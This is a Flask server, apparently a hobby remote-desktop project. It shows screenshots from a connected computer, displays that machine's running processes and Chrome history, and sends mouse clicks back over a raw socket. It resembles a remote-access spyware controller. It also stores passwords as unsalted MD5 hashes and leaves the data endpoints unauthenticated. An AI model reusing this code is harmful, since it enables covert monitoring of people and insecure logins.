from flask import Blueprint, request, render_template, Flask, redirect, jsonify, Response, send_file, make_response
from flask_login import LoginManager, UserMixin, login_user, login_required, current_user, logout_user
from flask_sqlalchemy import SQLAlchemy
import io
from wsgiref.util import FileWrapper
from sqlalchemy import func
from hashlib import md5
from zlib import decompress
from flask_socketio import SocketIO, send, emit
import base64
import socket
import threading
import functools


def create_app():
    app = Flask(__name__, template_folder='cmp_screen/templates')
    return app


app = create_app()
app.config['SECRET_KEY'] = "SECRETT$2"
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///db3.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
login_manager = LoginManager()
login_manager.init_app(app)
db = SQLAlchemy(app)
socketio = SocketIO(app)


class users(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.TEXT)
    password = db.Column(db.TEXT)
    email = db.Column(db.TEXT)


@login_manager.user_loader
def load_user(user_id):
    return users.query.get(int(user_id))


@app.route("/login", methods=["GET", "POST"])
@login_manager.unauthorized_handler
def login():
    '''
    The login function reverves the data from the client and checks if the user exists.
    If the user doesn't exist the function will return an error accordingly.
    '''
    if request.method == "POST":
        username = request.form['username']
        password = request.form['password']
        check_box = request.form['CheckBox']
        print(check_box)
        print(check_box)
        user_check = bool(users.query.filter_by(username=username).first())
        pass_check = bool(users.query.filter_by(password=md5(password.encode("utf-8")).hexdigest()).first())
        if user_check and not pass_check:
            return "password"
        elif not user_check:
            return "username"
        else:
            user = users.query.filter_by(username=username, password=md5(password.encode("utf-8")).hexdigest()).first()
            db.session.commit()
            app.permanent_session_lifetime = False
            if check_box == "True":  # always true for now
                login_user(user, remember=True)
            elif check_box == "False":  # disabled for now
                login_user(user, remember=False)
            else:
                return "An unexpected error has occurred"
            return "Great"
    if request.method == "GET":
        if current_user.is_authenticated:
            return redirect('/')
        else:
            return render_template('/login.html')


@app.route("/logout")
def logout():
    logout_user()
    return redirect("/")


@app.route("/register", methods=["GET", "POST"])
def register():
    '''
    The function registers the user to the site if the user doesn't exist & if he meets the 
    requirements that he needed to do.
    '''
    if request.method == "POST":
        username = request.form['username']
        password = request.form['password']
        email = request.form['email']
        print(username)
        user_check = bool(users.query.filter(func.lower(users.username) == func.lower(username)).first())
        email_check = bool(users.query.filter_by(email=email).first())

        if email_check and (email[-10:] not in "@gmail.com" or email.count("@gmail.com") > 1) and user_check:
            print("all")
            return "all"
        elif user_check and (email[-10:] not in "@gmail.com" or email.count("@gmail.com") > 1):
            print("u e c")
            return "username exist email contain"
        elif user_check and email_check:
            print("u e e")
            return "username exist email exist"
        elif email_check:
            return "email exist"
        elif email[-10:] not in "@gmail.com" or email.count("@gmail.com") > 1:
            return "email contain"
        elif user_check:
            return "username exist"
        else:
            new_user = users(username=username, password=md5(password.encode("utf-8")).hexdigest(), email=email)
            db.session.add(new_user)
            db.session.commit()
            return redirect('/')
    if request.method == "GET":
        if current_user.is_authenticated:
            return redirect('/')
        else:
            return render_template('/register.html')


"""@socketio.on("click")
def click():
    """

@app.route("/")
@login_required
def index():
    return render_template("index.html")

''' Client '''

file_cl = ""
pos_x = ""
pos_y = ""

@app.route('/computer')
@login_required
def root():
    return render_template('computer.html')


@app.route("/represent_file", methods=['GET'])
def re_file():
    '''
    The function returns a base64 encoded image that was sent to him from the client.
    '''
    if request.method == "GET":
        global file_cl
        try:
            base64_encoded_img = base64.b64encode(file_cl)
            base64_img = base64_encoded_img.decode('utf-8')
            return base64_img
        except:
            return "Err"


@app.route("/get_file", methods=['POST'])
def get_file():
    if request.method == "POST":
        global file_cl
        t_file = request.data
        file_cl = t_file
        try:
            base64_encoded_img = base64.b64encode(file_cl)
            base64_img = base64_encoded_img.decode('utf-8')
            socketio.emit("get-file", {
                "data": "OK"})  # The reason I am using socketio in here is so that I'll know when to ask for the new image.
        except:
            return "Err"
        return "200 OK"


@app.route("/info", methods=['POST'])
def info():
    data = request.get_json()
    running_procs = data["running processes"]
    search_history = data["chrome history"]
    formatted_procs = ""
    formatted_history = ""
    for process in running_procs:
        formatted_procs = formatted_procs + "--- PID: " + str(process["pid"]) + " --- " + "Name: " + str(process["name"]) + "--0" + "<br>"
    for history_tuple in search_history:
            print(history_tuple)
            formatted_history = formatted_history + "URL: " + history_tuple[0] + " DATE: " + history_tuple[1] + "<br>"
            # formatted_history = formatted_history + "Date: " + date + " URL: " + url
    # print(formatted_history)
    socketio.emit("info", {"procs": formatted_procs, "history" : formatted_history})
    return "200 OK"


@socketio.on("pic click")
def pic_click(data):
    global pos_x
    global pos_y
    pos_x = data["posX"]
    pos_y = data["posY"]
    print(pos_x)

"""@app.route("/action", methods=["POST"])
def action():"""

def so():
    global pos_x
    global pos_y
    s = socket.socket()         
    print ("Socket successfully created")
    port = 12345                
    s.bind(('', port))         
    print ("socket binded to %s" %(port))
    s.listen(5) # the amount of computers connected
    print ("socket is listening")
    c, addr = s.accept()
    print ('Got connection from', addr )
    while True:
        if pos_x != "" and pos_y != "":
            position = f'["{pos_x}", "{pos_y}"]'
            c.send(position.encode())
            pos_x = ""
            pos_y = ""
        

if __name__ == '__main__':
    socketio_func = functools.partial(socketio.run, app, host="0.0.0.0")
    threading.Thread(target=socketio_func).start()
    threading.Thread(target=so, daemon=True).start()
